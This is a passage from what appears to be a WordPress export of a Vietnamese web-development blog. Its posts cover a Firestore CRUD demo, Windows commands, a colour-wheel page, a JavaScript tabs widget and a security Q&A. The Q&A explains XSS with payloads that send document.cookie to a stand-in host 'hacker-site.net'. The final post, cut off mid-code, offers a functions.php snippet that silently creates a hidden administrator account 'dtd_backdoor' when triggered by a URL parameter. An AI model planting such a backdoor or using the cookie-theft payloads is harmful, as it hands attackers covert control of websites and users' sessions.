5. pkg-install: install các thư viện, dùng npm hoặc yarn
6. listr: quản lý nhiệm vụ và hiển thị đẹp hơn các quá trình cài đặt ncp, execa, pkg-install
7. chalk : console.log đẹp hơn

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1731</wp:post_id>
		<wp:post_date><![CDATA[2021-08-12 23:30:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-12 16:30:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-08-12 23:30:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-12 16:30:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[npx-p1-tao-cli]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[Cloud-Firestore: 1. Basic CRUD and Listen events on change value]]></title>
		<link>https://duycode.com/2021/08/10/cloud-firestore-1-basic-crud-and-listen-events-on-change-value/</link>
		<pubDate>Mon, 09 Aug 2021 18:00:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1794</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Firestore</title>
    <style>
        table {
            border-collapse: collapse;
            counter-reset: row_number 0;
        }

        tbody tr {
            counter-increment: row_number 1;
        }

        tbody tr td:first-child::before {
            content: counter(row_number);
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="app">
        <input type="text" placeholder="username" id="ip_username"><br />
        <input type="text" placeholder="email" id="ip_email"> <br />
        <button onclick="add_user(); reset_form()">Add User</button>
        <button onclick="update_user(); reset_form()">Update User</button>
        <button onclick="replace_user(); reset_form()">Replace User</button><br /><br />

        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Email</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="tbody_list"></tbody>
        </table>
    </div>

    <script>
        let ip_username = document.getElementById("ip_username");
        let ip_email = document.getElementById("ip_email");
        let tbody_list = document.getElementById("tbody_list");
        let uid = null;

        let create_row = (key, value) => {
            let tr = document.createElement("tr");
            tr.innerHTML = `<td data-id="${key}"></td><td>${value.username}</td><td>${value.email}</td>
                            <td><button onClick=get_user("${key}")>Sửa</button>
                                <button onClick=delete_user("${key}")>Xóa</button></td>`;
            return tr;
        }

        let add_row_table = (key, value) => {
            let tr = create_row(key, value);
            tbody_list.appendChild(tr);
        }

        let redraw_table = (listUser) => {
            tbody_list.innerHTML = "";
            Object.entries(listUser).forEach(([key, value], index) => {
                add_row_table(key, value)
            });
        }

        const reset_form = () => {
            ip_username.value = "";
            ip_email.value = "";
            uid = null;
        }
    </script>

    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->
    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-firestore.js"></script>
    <script>
        //Nếu chỉ dùng Database Realtime, chỉ cần config: databaseURL
        firebase.initializeApp({
            apiKey: 'AIzaSyADcAyM-3Fb7ZJdJf86yLKFUnZmxx-QHmU',
            authDomain: 'duycode-77e9a.web.app',
            projectId: 'duycode-77e9a'
        });
        const _db = firebase.firestore();

        // 1. CREAD: Add new User
        let add_user = () => {
            let user = {
                username: ip_username.value,
                email: ip_email.value,
            }
            // Dùng add => tự động tạo document mới và đặt auto ID
            _db.collection("Users").add(user)
                .then((docRef) => {
                    console.log("Document written with: ", docRef);
                })
                .catch(err => { console.error(err) })
        }

        // 2. READ: "doc(userId).get()": chỉ đọc 1 document
        let get_user = (userId) => {
            _db.collection("Users").doc(userId).get()
                .then((querySnapshot) => {
                    if (querySnapshot.exists) {
                        ip_username.value = querySnapshot.data().username;
                        ip_email.value = querySnapshot.data().email;
                        uid = userId;
                    }
                    else console.log("No data available");
                })
                .catch(err => { console.error(err) })
        }

        // 3. UPDATE
        let update_user = () => {
            let content = {
                username: ip_username.value,
                email: ip_email.value,
            }
            _db.collection("Users").doc(uid).update(content)
                .then((res) => {
                    console.log("Document successfully update!", res);
                })
                .catch(err => { console.error(err) })
        }

        // 4. REPLACE 
        let replace_user = () => {
            // Dùng set => tạo mới hoặc replace chính xác vị trí đó
            let content = {
                username: ip_username.value,
                email: ip_email.value,
            }
            _db.collection("Users").doc(uid).set(content)
                .then(res => console.log("Document successfully replace!", res))
                .catch(err => console.error(err))
        }

        //5. DELETE: Có thể dùng remove, hoặc "set(null)", hoặc update với "[key]: null"
        let delete_user = (uid) => {
            _db.collection("Users").doc(uid).delete()
                .then(res => console.log("Document successfully delete!", res))
                .catch(err => console.error(err))
            // Chuyện của delete
            // /users/J8mSwldSMsL2gAWDRZWi/id123/0UsnLdNdqdmJbMLkXUMf

        }


        // 6. READ: "get": Chỉ đọc database 1 lần duy nhất
        // Như vậy 6 và 7 không nên sử dụng cùng nhau
        _db.collection("Users").get()
            .then((querySnapshot) => {
                const listUser = {}
                querySnapshot.forEach((doc) => {
                    listUser[doc.id] = doc.data();
                });
                // redraw_table(listUser);
            })
            .catch(err => { console.error(err) })


        // 7. Event: Có thể lắng nghe các sự kiện của children khi thêm sửa xóa
        // Khi khởi chạy, dù thằng cha có nhiều thằng con từ trước
        // nhưng thằng "docChanges()" lại cứ hiểu là mới nhận về. thế mới đau

        _db.collection("Users").onSnapshot((snapshot) => {
            snapshot.docChanges().forEach((change) => {
                if (change.type === "added") {
                    add_row_table(change.doc.id, change.doc.data());
                }
                if (change.type === "modified") {
                    let new_tr = create_row(change.doc.id, change.doc.data());
                    let td = document.querySelector(`td[data-id="${change.doc.id}"]`);
                    td.closest('tr').outerHTML = new_tr.outerHTML;
                }
                if (change.type === "removed") {
                    let td = document.querySelector(`td[data-id="${change.doc.id}"]`);
                    td.closest('tr').remove();
                }
            });
        });

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1794</wp:post_id>
		<wp:post_date><![CDATA[2021-08-10 01:00:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-09 18:00:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-08-10 01:00:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-09 18:00:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cloud-firestore-1-basic-crud-and-listen-events-on-change-value]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="firebase"><![CDATA[FireBase]]></category>
						</item>
					<item>
		<title><![CDATA[Command Prompt in Win 10]]></title>
		<link>https://duycode.com/2021/08/21/command-prompt-in-win-10/</link>
		<pubDate>Sat, 21 Aug 2021 10:08:18 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1810</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Một số lệnh Command Prompt thường dùng</h2>
<img class="alignright" src="https://i.pinimg.com/originals/04/50/57/0450575354c633cd3fc82151a8ae0b26.png" alt="" />
<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands" rel="noopener noreferrer" target="_blank">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands</a>

<pre>
//Di chuyển thư mục, dùng dấu "/" và "\" tương tự
cd C:\Windows\System32
cd C:/Windows/System32
//Khi phải di chuyển sang ổ đĩa khác
cd /d D:\Games

//Di chuyển về thư mục gốc của ổ đĩa
cd /
//Di chuyển về thư mục cha
cd ..
</pre>

del /s /q "file_path"    => xóa file
rmdir /s /q "directory_path"  =>  xóa thư mục, /s=> xóa toàn bộ đường dẫn con, /q => ko cần hỏi lại



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1810</wp:post_id>
		<wp:post_date><![CDATA[2021-08-21 17:08:18]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-21 10:08:18]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-08-21 17:08:18]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-21 10:08:18]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[command-prompt-in-win-10]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
		<title><![CDATA[Bảng mã màu]]></title>
		<link>https://duycode.com/2021/09/24/bang-ma-mau/</link>
		<pubDate>Fri, 24 Sep 2021 15:31:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1901</guid>
		<description></description>
		<content:encoded><![CDATA[-- Tham khảo: <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/b3cdcd8d-e9af-4cc7-8bd0-9e9f3e5a9332/d1gntwe-6e8a8a71-efe4-4bea-8ef4-7d91ed7cffbb.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2IzY2RjZDhkLWU5YWYtNGNjNy04YmQwLTllOWYzZTVhOTMzMlwvZDFnbnR3ZS02ZThhOGE3MS1lZmU0LTRiZWEtOGVmNC03ZDkxZWQ3Y2ZmYmIucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.W90Qdr3UilrKMRpDvTnlx_o4PPmvs_WdIA0VXBhgPt8" alt="" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        :root {
            --baseWidth: 60px
        }

        #root {
            display: flex;
            flex-wrap: wrap;
        }

        .content {
            position: relative;
            margin: 10px;
            width: 400px;
            height: 400px;
            background-color: rgb(221, 210, 210);
        }

        .circle {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: calc((var(--i) + 1) * var(--baseWidth));
            height: calc((var(--i) + 1) * var(--baseWidth));
            border-radius: 50%;
            overflow: hidden;
        }

        .piece {
            position: absolute;
            top: 50%;
            left: 50%;
            width: calc((var(--i) + 1) / 2 * var(--baseWidth));
            height: calc((var(--i) + 1) / 4 * var(--baseWidth));
            transform: rotate(calc(var(--j) * 30deg)) skewX(60deg);
            transform-origin: 0 0;
            background-color: var(--color);
        }

        /*  itemColor.style.transform = `rotate(${j * 30}deg) skewX(60deg)`  */
    </style>
</head>

<body>
    <div id="root">
        <div class="content gray"></div>
        <div class="content black"></div>
        <div class="content white"></div>
    </div>
    <input id="ipColor" type="color">
    <script>
        const baseColor = ['#F00', '#F80', '#FF0', '#8F0', '#0F0', '#0F8', '#0FF', '#08F', '#00F', '#80F', '#F0F', '#F08']
        const turnColor = {
            toGrey: {
                0: ["8", "6", "4", "2", "0"],
                8: ["8", "8", "8", "8", "8"],
                F: ["8", "9", "B", "D", "F"],
            },
            toWhite: {
                0: ["F", "C", "9", "6", "3", "0"],
                8: ["F", "E", "D", "C", "A", "8"],
                F: ["F", "F", "F", "F", "F", "F"],
            },
            toBlack: {
                0: ["0", "0", "0", "0", "0", "0"],
                8: ["0", "1", "2", "4", "6", "8"],
                F: ["0", "3", "6", "9", "C", "F"],
            }
        }
        const listCircleGray = [],
            listCircleWhite = [],
            listCircleBlack = [];

        //listCircleGray from 0 to 4 => to Gray
        for (let i = 0; i < 5; i++) {
            listCircleGray[i] = baseColor.map(base => {
                let rgb = base.split('')
                rgb.shift()
                let newRgb = rgb.map(item => {
                    return turnColor.toGrey[item][i]
                })
                return "#" + newRgb.join('')
            })
        }

        //listCircleWhite from 0 to 5 => to White
        for (let i = 0; i < 6; i++) {
            listCircleWhite[i] = baseColor.map(base => {
                let rgb = base.split('')
                rgb.shift()
                let newRgb = rgb.map(item => {
                    return turnColor.toWhite[item][i]
                })
                return "#" + newRgb.join('')
            })
        }

        //listCircleBlack from 0 to 5 => to White
        for (let i = 0; i < 6; i++) {
            listCircleBlack[i] = baseColor.map(base => {
                let rgb = base.split('')
                rgb.shift()
                let newRgb = rgb.map(item => {
                    return turnColor.toBlack[item][i]
                })
                return "#" + newRgb.join('')
            })
        }

        console.log(listCircleGray);

        const grayElement = document.querySelectorAll('.content.gray')[0]
        const blackElement = document.querySelectorAll('.content.black')[0]
        const whiteElement = document.querySelectorAll('.content.white')[0]

        let content_gray = '', content_black = '', content_white = '';
        for (let i = 4; i >= 0; i--) {
            let listPieceGray = ''
            for (let j = 0; j < 12; j++) {
                listPieceGray += `<div class="piece" style="--i:${i}; --j:${j} ; --color:${listCircleGray[i][j]}"></div>`
            }
            content_gray += `<div class="circle" style="--i:${i}">${listPieceGray}</div>`
        }

        for (let i = 5; i >= 0; i--) {
            let listPieceBlack = '', listPieceWhite = '';
            for (let j = 0; j < 12; j++) {
                listPieceBlack += `<div class="piece" style="--i:${i}; --j:${j} ; --color:${listCircleBlack[i][j]}"></div>`
                listPieceWhite += `<div class="piece" style="--i:${i}; --j:${j} ; --color:${listCircleWhite[i][j]}"></div>`
            }
            content_black += `<div class="circle" style="--i:${i}">${listPieceBlack}</div>`
            content_white += `<div class="circle" style="--i:${i}">${listPieceWhite}</div>`
        }

        grayElement.innerHTML = content_gray;
        blackElement.innerHTML = content_black;
        whiteElement.innerHTML = content_white;
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1901</wp:post_id>
		<wp:post_date><![CDATA[2021-09-24 22:31:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-09-24 15:31:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-09-24 22:31:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-09-24 15:31:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[bang-ma-mau]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[Create Tabs by Javascript]]></title>
		<link>https://duycode.com/2021/12/03/create-tabs-by-javascript/</link>
		<pubDate>Fri, 03 Dec 2021 05:25:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1952</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. index.html</h2>
<pre>
<!DOCTYPE html>
<html lang='en'>

<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Document</title>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css' />
    <link rel='stylesheet' href='./style.css'>
    <script src='./functions.js'></script>
</head>

<body>
    <div class='container'>
        <div class='tabs' id='tabs-example'>
            <div class='tabs-title'>
                <div class='tabs-prev'>
                    <div><i class='fas fa-chevron-left'></i></div>
                </div>
                <div class='tabs-title-wrapper'>
                    <div class='tabs-title-contents'></div>
                </div>
                <div class='tabs-next'><i class='fas fa-chevron-right'></i></div>
                <div class='tabs-close-all'>Close all tab</i></div>
            </div>
            <div class='tabs-panel'></div>
        </div>
    </div>
</body>

</html>
</pre>

<h2>2. style.scss</h2>
<pre>
.container {
	width: 900px;
}

.tabs {
	--primary-color: green;
	--danger-color: red;
	--border-color: #ccc;
	width: 100%;
	border: 1px solid var(--border-color);
	.tabs-title {
		width: 100%;
		display: flex;
		border-bottom: 1px solid var(--border-color);
		.tabs-prev {
			border-right: 1px solid var(--border-color);
			padding: 15px 16px;
			cursor: pointer;
			&:hover {
				color: var(--primary-color);
			}
		}
		.tabs-title-wrapper {
			flex: 1;
			position: relative;
			overflow: hidden;
			.tabs-title-contents {
				top: 0;
				left: 0;
				position: absolute;
				display: flex;
				flex-wrap: nowrap;
				transition: 0.5s;
				.tabs-title-item {
					padding: 15px 16px;
					cursor: pointer;
					border-right: 1px solid var(--border-color);
					display: flex;
					align-items: center;
					&.active {
						color: var(--primary-color);
					}
					.tabs-title-item-label {
                        white-space: nowrap;
						&:hover {
							color: var(--primary-color);
						}
					}
					.tabs-title-item-close {
						padding-left: 16px;
						font-size: 0.8rem;
						&:hover {
							color: var(--danger-color);
						}
					}
				}
			}
		}
		.tabs-next {
			border-left: 1px solid var(--border-color);
			padding: 15px 16px;
			cursor: pointer;
			&:hover {
				color: var(--primary-color);
			}
		}
		.tabs-close-all {
			border-left: 1px solid var(--border-color);
			padding: 15px 16px;
			cursor: pointer;
			&:hover {
				color: var(--primary-color);
			}
		}
	}
	.tabs-panel {
		height: 300px;
		padding: 0.5rem 1rem;
	}
}
</pre>

<h2>3. functions.js</h2>
<pre>
const dataTabsExample = [
	{
		key: 'i1',
		label: 'item 1',
		content: '<div>This is item 1</div>',
	},
	{
		key: 'i2',
		label: 'item 2',
		content: '<div>This is item 2</div>',
	},
	{
		key: 'i3',
		label: 'item 3',
		content: '<div>This is item 3</div>',
	},
	{
		key: 'i4',
		label: 'item 4',
		content: '<div></div>This is item 4</div>',
	},
	{
		key: 'i5',
		label: 'item 5',
		content: '<div>This is item 5</div>',
	},
	{
		key: 'i6',
		label: 'item 6',
		content: '<div>This is item 6</div>',
	},
	{
		key: 'i7',
		label: 'item 7',
		content: '<div>This is item 7</div>',
	},
	{
		key: 'i8',
		label: 'item 8',
		content: '<div>This is item 8</div>',
	},
	{
		key: 'i9',
		label: 'item 9',
		content: '<div>This is item 9</div>',
	},
	{
		key: 'i10',
		label: 'item 10',
		content: '<div>This is item 10</div>',
	},
	{
		key: 'i11',
		label: 'item 11',
		content: '<div>This is item 11</div>',
	},
	{
		key: 'i12',
		label: 'item 12',
		content: '<div>This is item 12</div>',
	},
]

class TabsElement {
	constructor(tabsElement, data) {
		this.tabsElement = tabsElement
		this.tabsTitleContent = this.tabsElement.querySelector('.tabs-title-contents')
		this.tabsPanel = this.tabsElement.querySelector('.tabs-panel')

		this.currentPagesTab = 0
		this.initial(data)
		this.listenEvent()
	}

	initial(data) {
		const that = this
		data.forEach(item => that.add(item))
	}
	listenEvent() {
		const that = this
		this.tabsElement.addEventListener('click', e => {
			if (e.target.classList.contains('tabs-title-item-label')) {
				const key = e.target.closest('.tabs-title-item').dataset.tabsKey
				that.active(key)
			}
			if (e.target.closest('.tabs-title-item-close')) {
				const key = e.target.closest('.tabs-title-item').dataset.tabsKey
				that.remove(key)
			}
			if (e.target.classList.contains('tabs-close-all')) {
				that.tabsTitleContent.innerHTML = ''
				that.tabsPanel.innerHTML = ''
			}
			if (e.target.closest('.tabs-prev')) {
				if (that.currentPagesTab <= 0) return
				that.currentPagesTab--
				that.movePositionPageTabs(that.currentPagesTab)
			}
			if (e.target.closest('.tabs-next')) {
				if (that.currentPagesTab >= that.tabsCreatePage().length - 1) return
				that.currentPagesTab++
				that.movePositionPageTabs(that.currentPagesTab)
			}
		})
	}
	tabsCreatePage() {
		const wrapperWidth = this.tabsElement.querySelector('.tabs-title-wrapper').offsetWidth
		const listPoint = []
		const listTabsTitle = this.tabsElement.querySelectorAll('.tabs-title-item')

		let tempPlusWidth = 0,
			onWidth = 0,
			pageStart = 0

		for (let index = 0; index < listTabsTitle.length; index++) {
			let itemWidth = listTabsTitle[index].offsetWidth

			tempPlusWidth += itemWidth
			onWidth += itemWidth

			if (tempPlusWidth > wrapperWidth) {
				listPoint.push({
					pageStart,
					pageEnd: index - 1,
					onWidth: onWidth - itemWidth,
				})
				pageStart = index
				tempPlusWidth = itemWidth
			}
			if (index === listTabsTitle.length - 1) {
				listPoint.push({
					pageStart,
					pageEnd: index,
					onWidth,
				})
			}
		}
		return listPoint
	}
	movePositionPageTabs(indexPage) {
		const wrapperWidth = this.tabsElement.querySelector('.tabs-title-wrapper').offsetWidth
		if (indexPage == 0) {
			this.tabsTitleContent.style.left = '0px'
		}
		if (indexPage != 0) {
			this.tabsTitleContent.style.left =
				wrapperWidth - this.tabsCreatePage()[indexPage].onWidth + 'px'
		}
	}
	add({ key, label, content }) {
		this.tabsTitleContent.innerHTML += `<div class=&quot;tabs-title-item&quot; data-tabs-key=&quot;${key}&quot;>
                <div class=&quot;tabs-title-item-label&quot;>${label}</div>
                <div class=&quot;tabs-title-item-close&quot;><i class=&quot;fas fa-times&quot;></i></div>
            </div>`
		this.tabsPanel.innerHTML += `<div class=&quot;tabs-panel-item&quot; data-tabs-key=&quot;${key}&quot;>${content}</div>`
	}
	active(key) {
		const listTitleItem = this.tabsElement.querySelectorAll('.tabs-title-item')
		for (let i = 0; i < listTitleItem.length; i++) {
			listTitleItem[i].classList.remove('active')
		}
		const listPanelItem = this.tabsElement.querySelectorAll('.tabs-panel-item')
		for (let i = 0; i < listPanelItem.length; i++) {
			listPanelItem[i].style.display = 'none'
		}
		this.tabsElement
			.querySelector(`div.tabs-title-item[data-tabs-key='${key}']`)
			.classList.add('active')
		this.tabsElement.querySelector(
			`div.tabs-panel-item[data-tabs-key='${key}']`,
		).style.display = ''
	}
	remove(key) {
		this.tabsElement.querySelector(`.tabs-panel-item[data-tabs-key='${key}']`).remove()
		this.tabsElement.querySelector(`.tabs-title-item[data-tabs-key='${key}']`).remove()
	}
}

window.addEventListener('load', () => {
	new TabsElement(document.getElementById('tabs-example'), dataTabsExample)
})
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1952</wp:post_id>
		<wp:post_date><![CDATA[2021-12-03 12:25:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-03 05:25:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-14 15:01:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-14 15:01:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[create-tabs-by-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi Web Developer - P1.  bảo mật]]></title>
		<link>https://duycode.com/2021/12/01/cau-hoi-web-developer-p1-bao-mat/</link>
		<pubDate>Wed, 01 Dec 2021 01:00:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1981</guid>
		<description></description>
		<content:encoded><![CDATA[    <script>
        const toggleContent = function (element) {
            const content = element.closest('div[data-tag="container"]').querySelector('div[data-tag="content"]')
            if (content.style.display !== "none") content.style.display = 'none'
            else content.style.display = ''
        }
    </script>
<h3>Câu 1. CORS là gì ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
- CORS: <strong>Cross Origin Resource Sharing</strong>
- CORS là một trong những chính sách bảo mật Same Origin Policy, một chính sách bảo mật được cài đặt trên toàn bộ các trình duyệt hiện nay. Chính sách này để ngăn chặn hoặc cho phép việc truy cập tài nguyên từ Orign này đến Origin khác

<strong>A. Client</strong>
- Khi Client gửi 1 request lên Server. Request này tự động được gắn HTTP Header với thông tin Origin (Thông tin Origin của Client không thể thay đổi được)
- Origin bao gồm 3 thành phần, VD: https://facebook.com:80
 + Protocol: http hoặc https
 + Domain
 + Port

<strong>A. Server</strong>
- Bên Server cài đặt 3 thành phần: Origin, Methods, Content-Type
- VD: Khi sử dụng NodeJS, cài đặt middleware cho phép truy cập từ mọi nguồn
<pre>
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*')
    res.header('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE')
    res.header('Access-Control-Allow-Headers', 'Content-Type')
    next()
})
</pre>

<button onclick="toggleContent(this)">Hide</button></div></div>

<h3>Câu 2. XSS là gì ?</h3>
<div data-tag='container'><button onclick="toggleContent(this)">Show/Hide</button><div style="display: none;" data-tag='content'>
- XSS: Cross Site Scripting
- XSS là 1 dạng tấn công mà hacker chèn mã độc vào các đoạn script để người dùng thực thi phía Client
- Mục đích tấn công: lấy cookies, session, tokens của người dùng => chiếm quyền truy cập của người dùng

<strong>A. Các dạng tấn công thường thấy</strong>
1. Reflected XSS
- Dạng này thường tấn công 1 người dùng cụ thể
- Hacker gửi cho người dùng URL dạng
http://example.com/name=var+i=new+Image;+i.src="http://hacker-site.net/"%2Bdocument.cookie
--> Sau khi click vào link trên, đoạn script sẽ đc thực hiện, và gửi cookie đến site của hacker
var i=new Image; i.src="http://hacker-site.net/"+document.cookie;

2. Stored XSS
- Trong bài viết, hoặc trong 1 comment, hacker đăng bài, trong đó nội dung được kèm theo 1 đoạn script
<pre>
<script type=”text/javascript”>
// Nội dung bài viết
var test='../example.php?cookie_data='+escape(docuent.cookie);
// Nội dung bài viết
</script>
</pre>
- Loại tấn công này, thì cứ khi nào nạn nhân vào đọc bài viết đó thì sẽ thực thi mã độc

<button onclick="toggleContent(this)">Hide</button></div></div>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1981</wp:post_id>
		<wp:post_date><![CDATA[2021-12-01 01:00:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-01 01:00:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-11 04:06:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-11 04:06:41]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-web-developer-p1-bao-mat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						</item>
					<item>
		<title><![CDATA[Wordpress - Một số vấn đề]]></title>
		<link>https://duycode.com/2021/12/12/wordpress-mot-so-van-de/</link>
		<pubDate>Sun, 12 Dec 2021 10:56:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1954</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Bật chế độ sửa lỗi </h2>
-- Sửa file: /wp-config.php
<pre>
define( 'WP_DEBUG', true );
define( 'WP_DEBUG_LOG', true );
define( 'WP_DEBUG_DISPLAY', true );
</pre>

<h2>2. Add User by functions.php</h2>
- Thêm đoạn code sau vào functions.php
<pre>
add_action('wp_head', 'yourbackdoor');
function yourbackdoor() {
    if (isset($_REQUEST['go']) && $_REQUEST['go'] == 'backdoor' ) {
        require('wp-includes/registration.php');
        if (!username_exists('dtd_backdoor')) {
            $user_id = wp_create_user('dtd_backdoor', 'dtd_backdoor');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

add_action('pre_user_query', 'yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    if ($username != '123') {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
